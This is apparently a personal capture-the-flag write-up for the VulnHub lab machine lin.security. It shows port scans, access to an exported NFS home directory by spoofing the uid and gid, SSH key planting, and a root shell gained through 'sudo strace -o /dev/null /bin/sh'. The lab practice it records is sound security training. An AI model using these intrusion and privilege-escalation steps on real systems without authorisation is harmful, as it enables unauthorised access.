# BOX NAME: lin.security
**LINK**: https://www.vulnhub.com/entry/linsecurity-1,244/

<details open><summary><ins>SUMMARY</ins></summary>

```
1. Enumerate ports
2. Find NFS
3. Manipulate user and group id's
4. create ssh-keys as peter
5. run gtfo-bin on strace

This box took me roughly 10 minutes to compromise after I spun it up.
I feel like I skipped a few steps since the initial user "Peter" which I compromised had access to run sudo.

I found a bob and susan user after I rooted the box. 
Susan had a secret file in her home dir.

There was no need for fuzzing. Nothing more interesting than NFS and SSH running.
```
</details>

# REMOTE ENUMERATION:

<details><summary><ins>TARGET</ins></summary>

```
[+] IP:		10.77.0.89
[+] URL:	N/A
```
</details>
<details><summary><ins>NMAP</ins></summary>

```
└─$ nmap -sV -sC -p 22,111,2049,34105,47371,52387,60159 10.77.0.89 -oN nmap-ports-linsec.log 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-26 22:19 CEST
Nmap scan report for 10.77.0.89
Host is up (0.00044s latency).

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7a:9b:b9:32:6f:95:77:10:c0:a0:80:35:34:b1:c0:00 (RSA)
|   256 24:0c:7a:82:78:18:2d:66:46:3b:1a:36:22:06:e1:a1 (ECDSA)
|_  256 b9:15:59:78:85:78:9e:a5:e6:16:f6:cf:96:2d:1d:36 (ED25519)
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100005  1,2,3      33565/tcp6  mountd
|   100005  1,2,3      37337/udp   mountd
|   100005  1,2,3      51185/udp6  mountd
|   100005  1,2,3      60159/tcp   mountd
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
34105/tcp open  nlockmgr 1-4 (RPC #100021)
47371/tcp open  mountd   1-3 (RPC #100005)
52387/tcp open  mountd   1-3 (RPC #100005)
60159/tcp open  mountd   1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.43 seconds

```
```
└─$ jml-scanner -u 10.77.0.89 -p 65535

+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|J|M|L|-|P|O|R|T|S|C|A|N|N|E|R|
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

[+] Port 22 is open.
[+] Port 111 is open.
[+] Port 2049 is open.
[+] Port 34105 is open.
[+] Port 47371 is open.
[+] Port 52387 is open.
[+] Port 60159 is open.

[+] A total of 7 found ports open  
```
</details>
<details><summary><ins>WEB</ins></summary>

whatweb-scan
```

```

nikto-scan
```

```

fuzzing
```

```
other
```

```

</details>

<details><summary><ins>SERVICES</ins></summary>

FTP
```

```

SSH
```
└─$ nc 10.77.0.89 22
SSH-2.0-OpenSSH_7.6p1 Ubuntu-4
```
```
└─$ showmount -e 10.77.0.89         
Export list for 10.77.0.89:
/home/peter *

sudo mount -t nfs 10.77.0.89:/home/peter peter/

Folders and ID's are:
drwxr-xr-x 5 1001 1005 4096 Jul 10  2018 .
drwxr-xr-x 3 jml  jml  4096 Jun 26 22:21 ..
-rw-r--r-- 1 1001 1005  220 Jul  9  2018 .bash_logout
-rw-r--r-- 1 1001 1005 3771 Jul  9  2018 .bashrc
drwx------ 2 1001 1005 4096 Jul 10  2018 .cache
-rw-rw-r-- 1 1001 1005    0 Jul 10  2018 .cloud-locale-test.skip
drwx------ 3 1001 1005 4096 Jul 10  2018 .gnupg
drwxrwxr-x 3 1001 1005 4096 Jul 10  2018 .local
-rw-r--r-- 1 1001 1005  807 Jul  9  2018 .profile

manipulate the user:
sudo addgroup --gid 1005 peter
sudo adduser --uid 1001 --gid 1005

Now we have access:
└─$ ll       
total 36
drwxr-xr-x 6 peter peter 4096 Jun 26 22:33 .
drwxr-xr-x 3 jml   jml   4096 Jun 26 22:31 ..
-rw-r--r-- 1 peter peter  220 Jul  9  2018 .bash_logout
-rw-r--r-- 1 peter peter 3771 Jul  9  2018 .bashrc
drwx------ 2 peter peter 4096 Jul 10  2018 .cache
-rw-rw-r-- 1 peter peter    0 Jul 10  2018 .cloud-locale-test.skip
drwx------ 3 peter peter 4096 Jul 10  2018 .gnupg
drwxrwxr-x 3 peter peter 4096 Jul 10  2018 .local
-rw-r--r-- 1 peter peter  807 Jul  9  2018 .profile
drwxr-xr-x 2 peter peter 4096 Jun 26 22:33 .ssh

(note the username "peter")
```

SNMP
```

```

DNS
```

```

MAILSERVICES (POP, IMAP, SMTP)
```

```

LDAP
```

```

</details>

<details><summary><ins>Active Directory</ins></summary>

Active Directory
```

```
</details>

<details><summary><ins>SUMMARY REMOTE</ins></summary>

```
1.
2.
3.
```
</details>

# LOCAL ENUMERATION:

<details><summary><ins>FILES OF INTEREST</ins></summary>

**FILES**:
```
peter@linsecurity:~$ sudo -l
Matching Defaults entries for peter on linsecurity:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User peter may run the following commands on linsecurity:
    (ALL) NOPASSWD: /usr/bin/strace
peter@linsecurity:~$ sudo strace -o /dev/null /bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
# 
```

**SUID's**:

```

```
**SGID's**:

```

```
**OTHERS**:

```

```
</details>


# LOOT

<details><summary><ins>USEFUL INFORMATION:</ins></summary>

**Kernel Info:**
*file /bin/bash ; echo -e " \\n" && lsb_release -a ; echo -e "\\n" && uname -a*
```

```
</details>

<details><summary><ins>CREDS:</ins></summary>

```
username:password
```
</details>

<details><summary><ins>HASHES:</ins></summary>

```

```
</details>

# PROOFS

<details><summary><ins>Proofs</ins></summary>

Final payload:
```
sudo strace -o /dev/null /bin/sh
```

```
peter@linsecurity:~$ sudo -l
Matching Defaults entries for peter on linsecurity:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User peter may run the following commands on linsecurity:
    (ALL) NOPASSWD: /usr/bin/strace
peter@linsecurity:~$ sudo strace -o /dev/null /bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
# 
```

</details>